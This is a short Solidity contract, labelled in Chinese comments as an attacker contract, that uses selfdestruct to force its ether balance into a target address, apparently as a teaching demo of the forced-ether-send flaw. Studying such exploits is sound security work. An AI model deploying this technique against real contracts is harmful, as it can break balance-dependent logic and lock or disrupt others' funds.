// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

// 攻击者合约
contract Attack {
    // 构造函数，设置为payable
    constructor() payable {}

    // 攻击函数，参数为目标合约地址
    function attack(address _addr) external {
        selfdestruct(payable(_addr));
    }

    // 查看合约余额
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
